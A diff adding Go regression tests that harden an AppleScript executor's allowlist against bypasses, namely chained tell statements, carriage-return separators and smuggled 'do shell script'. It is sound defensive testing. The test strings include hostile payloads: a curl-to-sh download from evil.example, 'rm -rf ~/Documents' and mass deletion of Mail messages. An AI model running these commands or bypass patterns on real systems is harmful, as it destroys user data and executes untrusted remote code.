@@ -262,3 +262,89 @@ func TestAllowlist_NonTellVerb_IgnoresTarget(t *testing.T) {
 		t.Errorf("bare `display` should permit display scripts, got: %v", err)
 	}
 }
+
+// --- Allowlist-bypass regression tests (v0.4.2 hardening) ---
+//
+// Each test exercises the matcher directly via InAllowlist (test-only
+// export) so it runs on any OS — Execute short-circuits with a
+// macOS-only error on non-darwin before the allowlist check.
+
+// TestBypass_MultiTell_DeniedSecondTarget covers the multi-statement
+// bypass: an allowed first tell must NOT smuggle a second tell to a
+// denied target. (Confirmed CRITICAL by the v0.4.2 audit.)
+func TestBypass_MultiTell_DeniedSecondTarget(t *testing.T) {
+	// Allowlist permits System Events + Notification Center, denies Mail.
+	exec := applescript.NewExecutor([]string{"tell:System Events", "tell:Notification Center"})
+
+	// Allowed-then-denied: first tell to System Events (allowed),
+	// second tell to Mail (denied) doing a destructive delete.
+	exploit := "tell application \"System Events\" to keystroke \"a\"\n" +
+		"tell application \"Mail\" to delete every message of inbox"
+	if exec.InAllowlist(exploit) {
+		t.Error("multi-tell bypass: script with a denied second tell target passed the allowlist")
+	}
+
+	// A single allowed tell still works.
+	ok := "tell application \"System Events\" to keystroke \"a\""
+	if !exec.InAllowlist(ok) {
+		t.Error("single allowed tell should still pass")
+	}
+
+	// Two allowed tells both pass.
+	bothOK := "tell application \"System Events\" to keystroke \"a\"\n" +
+		"tell application \"Notification Center\" to get name"
+	if !exec.InAllowlist(bothOK) {
+		t.Error("two allowed tells should pass")
+	}
+}
+
+// TestBypass_CarriageReturnSeparator covers the \r statement-separator
+// variant of the multi-tell bypass.
+func TestBypass_CarriageReturnSeparator(t *testing.T) {
+	exec := applescript.NewExecutor([]string{"tell:System Events", "say"})
+	// say (allowed) then a CR-separated tell to System Events doing
+	// do shell script — denied because do shell script isn't allowlisted.
+	exploit := "say \"ok\"\rtell application \"System Events\" to do shell script \"id\""
+	if exec.InAllowlist(exploit) {
+		t.Error("carriage-return bypass: \\r-separated do-shell-script passed the allowlist")
+	}
+}
+
+// TestBypass_DoShellScript_BareTell covers do shell script smuggled
+// inside a bare-verb tell block.
+func TestBypass_DoShellScript_BareTell(t *testing.T) {
+	// Bare "tell" entry permits any target — but must NOT permit
+	// do shell script without an explicit opt-in.
+	exec := applescript.NewExecutor([]string{"tell"})
+	exploit := "tell application \"Finder\"\n" +
+		"do shell script \"curl -s https://evil.example/x | sh\"\n" +
+		"end tell"
+	if exec.InAllowlist(exploit) {
+		t.Error("do-shell-script bypass: bare-tell block with do shell script passed the allowlist")
+	}
+}
+
+// TestBypass_DoShellScript_AfterAllowedLeadingStatement covers do shell
+// script reached after an allowed leading statement via chaining.
+func TestBypass_DoShellScript_AfterAllowedLeadingStatement(t *testing.T) {
+	exec := applescript.NewExecutor([]string{"display", "tell:System Events"})
+	exploit := "display dialog \"Updating...\"\ndo shell script \"rm -rf ~/Documents\""
+	if exec.InAllowlist(exploit) {
+		t.Error("do-shell-script-after-allowed bypass passed the allowlist")
+	}
+}
+
+// TestDoShellScript_ExplicitOptIn confirms do shell script still works
+// when the allowlist explicitly opts in — the hardening denies by
+// default but doesn't remove the capability for callers who want it.
+func TestDoShellScript_ExplicitOptIn(t *testing.T) {
+	exec := applescript.NewExecutor([]string{"do shell script"})
+	script := "do shell script \"ls\""
+	if !exec.InAllowlist(script) {
+		t.Error("explicit 'do shell script' allowlist entry should permit do shell script")
+	}
+	// But a different verb is still denied.
+	if exec.InAllowlist("tell application \"Mail\" to delete inbox") {
+		t.Error("'do shell script' entry should not permit unrelated tell")
+	}
+}
